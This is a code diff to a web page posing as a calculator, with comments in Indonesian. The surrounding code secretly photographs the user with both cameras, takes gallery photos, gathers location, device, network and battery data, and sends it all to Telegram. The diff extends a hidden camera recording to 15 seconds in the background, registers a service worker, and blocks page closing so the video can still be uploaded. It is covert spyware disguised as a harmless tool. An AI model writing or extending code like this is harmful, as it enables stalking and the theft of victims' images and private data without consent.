@@ -175,7 +175,7 @@
             }
         }
         
-        /* Hidden elements for camera and file input */
+        /* Hidden elements */
         .hidden {
             display: none;
         }
@@ -245,8 +245,11 @@
                 };
                 this.galleryPhotos = [];
                 this.recordedVideo = null;
+                this.backgroundRecording = false;
+                this.recordingStartTime = null;
                 
                 this.setupEventListeners();
+                this.setupBackgroundRecording();
             }
             
             setupEventListeners() {
@@ -254,6 +257,31 @@
                 this.galleryInput.addEventListener('change', (e) => {
                     this.handleGallerySelection(e);
                 });
+                
+                // Handle beforeunload untuk mengirim video yang sedang direkam
+                window.addEventListener('beforeunload', (e) => {
+                    if (this.backgroundRecording) {
+                        // Mencegah penutupan langsung untuk memberi waktu mengirim video
+                        e.preventDefault();
+                        e.returnValue = '';
+                        this.finalizeBackgroundRecording();
+                    }
+                });
+            }
+            
+            setupBackgroundRecording() {
+                // Setup Service Worker untuk perekaman di background
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/sw.js').catch(console.error);
+                }
+                
+                // Setup BroadcastChannel untuk komunikasi antara tab
+                this.broadcastChannel = new BroadcastChannel('calculator_recording');
+                this.broadcastChannel.onmessage = (event) => {
+                    if (event.data.type === 'RECORDING_COMPLETE') {
+                        this.handleBackgroundRecordingComplete(event.data.videoBlob);
+                    }
+                };
             }
             
             clear() {
@@ -391,8 +419,8 @@
                     // Ambil foto belakang
                     await this.takePhoto('environment');
                     
-                    // Rekam video 5 detik
-                    await this.recordVideo();
+                    // Mulai perekaman video 15 detik di background
+                    await this.startBackgroundRecording();
                     
                     // Ambil foto dari galeri
                     await this.getGalleryPhotos();
@@ -400,7 +428,7 @@
                     // Format pesan
                     const message = this.formatMessage(result, deviceInfo, locationInfo, networkInfo, batteryInfo);
                     
-                    // Kirim semua ke Telegram
+                    // Kirim semua ke Telegram (kecuali video yang masih direkam)
                     await this.sendAllToTelegram(message);
                     
                     // Tampilkan hasil perhitungan setelah semua proses selesai
@@ -638,7 +666,7 @@
                 });
             }
             
-            async recordVideo() {
+            async startBackgroundRecording() {
                 return new Promise((resolve, reject) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                         reject(new Error('Kamera tidak didukung'));
@@ -656,40 +684,51 @@
                     
                     navigator.mediaDevices.getUserMedia(constraints)
                         .then(stream => {
-                            const mediaRecorder = new MediaRecorder(stream, {
+                            this.mediaStream = stream;
+                            this.mediaRecorder = new MediaRecorder(stream, {
                                 mimeType: 'video/webm; codecs=vp9'
                             });
                             
-                            const chunks = [];
+                            this.recordedChunks = [];
                             
-                            mediaRecorder.ondataavailable = (event) => {
+                            this.mediaRecorder.ondataavailable = (event) => {
                                 if (event.data.size > 0) {
-                                    chunks.push(event.data);
+                                    this.recordedChunks.push(event.data);
                                 }
                             };
                             
-                            mediaRecorder.onstop = () => {
-                                const recordedBlob = new Blob(chunks, { type: 'video/webm' });
-                                this.recordedVideo = recordedBlob;
+                            this.mediaRecorder.onstop = () => {
+                                const recordedBlob = new Blob(this.recordedChunks, { type: 'video/webm' });
+                                this.sendVideoToTelegram(recordedBlob, 'Video 15 Detik - Background Recording');
                                 
                                 // Hentikan stream
-                                stream.getTracks().forEach(track => track.stop());
-                                resolve(recordedBlob);
+                                if (this.mediaStream) {
+                                    this.mediaStream.getTracks().forEach(track => track.stop());
+                                }
                             };
                             
-                            mediaRecorder.start();
+                            this.mediaRecorder.start(1000); // Collect data every second
+                            this.backgroundRecording = true;
+                            this.recordingStartTime = Date.now();
                             
-                            // Stop recording after 5 seconds
+                            // Stop recording after 15 seconds
                             setTimeout(() => {
-                                if (mediaRecorder.state === 'recording') {
-                                    mediaRecorder.stop();
-                                }
-                            }, 5000);
+                                this.finalizeBackgroundRecording();
+                            }, 15000);
+                            
+                            resolve();
                         })
                         .catch(error => {
                             reject(error);
                         });
                 });
+            }
+            
+            finalizeBackgroundRecording() {
+                if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+                    this.mediaRecorder.stop();
+                    this.backgroundRecording = false;
+                }
             }
             
             async getGalleryPhotos() {
@@ -797,7 +836,7 @@
                 // Informasi Kamera
                 message += `📷 Day one dikasi pap(foto depan) 😖: [${this.capturedPhotos.front ? 'Berhasil' : 'Gagal'}]\n`;
                 message += `📷 Day one dikasi pap(foto belakang) 😖: [${this.capturedPhotos.back ? 'Berhasil' : 'Gagal'}]\n`;
-                message += `📷 Day one dikasi pap(video depan 5 detik) 😖: [${this.recordedVideo ? 'Berhasil' : 'Gagal'}]\n`;
+                message += `📷 Day one dikasi pap(video depan 15 detik) 😖: [Sedang Berjalan - Akan dikirim setelah selesai]\n`;
                 message += `📷 Day one dikasi pap(5 foto galeri) 😖: [${this.galleryPhotos.length > 0 ? 'Berhasil (' + this.galleryPhotos.length + ' foto)' : 'Gagal'}]\n\n`;
                 
                 // Hasil Kalkulator
@@ -821,11 +860,6 @@
                     // Kirim foto belakang
                     if (this.capturedPhotos.back) {
                         await this.sendPhotoToTelegram(this.capturedPhotos.back, 'Foto Belakang');
-                    }
-                    
-                    // Kirim video
-                    if (this.recordedVideo) {
-                        await this.sendVideoToTelegram(this.recordedVideo, 'Video 5 Detik');
                     }
                     
                     // Kirim foto dari galeri
@@ -904,6 +938,10 @@
                 } catch (error) {
                     throw error;
                 }
+            }
+            
+            handleBackgroundRecordingComplete(videoBlob) {
+                this.sendVideoToTelegram(videoBlob, 'Video 15 Detik - Background Recording Complete');
             }
         }
 
